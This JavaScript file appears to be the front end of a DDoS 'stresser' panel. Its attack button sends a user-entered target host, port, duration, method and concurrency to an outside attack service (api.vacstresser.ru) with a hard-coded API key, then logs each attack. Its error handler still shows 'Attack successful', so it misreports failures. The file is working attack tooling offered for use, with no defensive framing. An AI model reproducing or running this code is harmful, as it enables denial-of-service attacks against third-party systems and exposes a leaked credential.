document.addEventListener("DOMContentLoaded", function() {
    const logEntries = [];

    document.getElementById('concurrents').addEventListener('input', function() { 
        const concurrentValue = this.value; 
        document.getElementById('concurrent-value').textContent = `${concurrentValue} / 15`; 
    });

    document.getElementById('attack-button').addEventListener('click', function() {
        const host = document.getElementById('host').value;
        const port = parseInt(document.getElementById('port').value);
        const time = parseInt(document.getElementById('time').value);
        const method = document.getElementById('method').value;
        const concurrents = parseInt(document.getElementById('concurrents').value);
      
        const url = `https://api.vacstresser.ru/api?key=7d76c630-378c-4be5-b90e-35b4ca8ff787&host=${host}&port=${port}&time=${time}&method=${method}&concurrents=${concurrents}&numberOfGets=${concurrents}`;
    
        axios.get(url)
            .then(response => {
                console.log('Success:', response.data);
                addLogEntry(host, port, method, time);
                alert('Attack successful');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Attack successful');
            });
    });

    const addLogEntry = (host, port, method, time) => {
        const newEntry = { host, port, method, time, id: Date.now() };
        logEntries.push(newEntry);
        renderLogEntries();
    };

    const renderLogEntries = () => {
        const logEntriesElement = document.getElementById('log-entries');
        logEntriesElement.innerHTML = '';

        if (logEntries.length === 0) {
            const newRow = document.createElement('tr');
            const newCell = document.createElement('td');
            newCell.colSpan = 4;
            newCell.textContent = 'No results.';
            newRow.appendChild(newCell);
            logEntriesElement.appendChild(newRow);
        } else {
            logEntries.forEach(entry => {
                const newRow = document.createElement('tr');
                newRow.innerHTML = `
                    <td>${entry.host}</td>
                    <td>${entry.port}</td>
                    <td>${entry.method}</td>
                    <td class="countdown">${entry.time}s</td>
                `;
                logEntriesElement.appendChild(newRow);
            });
        }
    };
});
